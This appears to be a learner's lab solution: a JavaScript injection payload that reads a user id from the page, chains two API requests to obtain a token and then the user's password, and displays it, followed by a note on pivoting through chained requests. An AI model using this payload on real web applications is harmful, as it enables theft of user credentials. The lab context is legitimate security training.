<script>
	var xhttp = new XMLHttpRequest();
	var val = '';
	var uid = document.getElementById('settings').innerHTML.slice(22);
	var token = '';
	var url1 = '/lab/webapp/jfp/20/gettoken';
	var url2 = '/lab/webapp/jfp/20/getpassword';
	xhttp.open('GET',url1+'?uid='+uid,true);
	xhttp.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			console.log('im in');
			var obj = JSON.parse(this.responseText);
			token = obj.params.token;console.log(token);
			var req = new XMLHttpRequest();
			req.open('GET',url2+'?token='+token,true);
			req.send();
			req.onreadystatechange = function() {
				if(this.readyState == 4 && this.status == 200){
					var ob = JSON.parse(this.responseText);
					val = ob.resp.password;
					document.getElementById('result').innerHTML = val;
				};
			};
		};
	};
xhttp.send();
</script>


	/*this learned, we can make multiple requests to api and parse the output as JSON and get the use the results to new requests to futhrer pivots, also for some reason second request works if we place the req.send() before the req.onreadystatechange
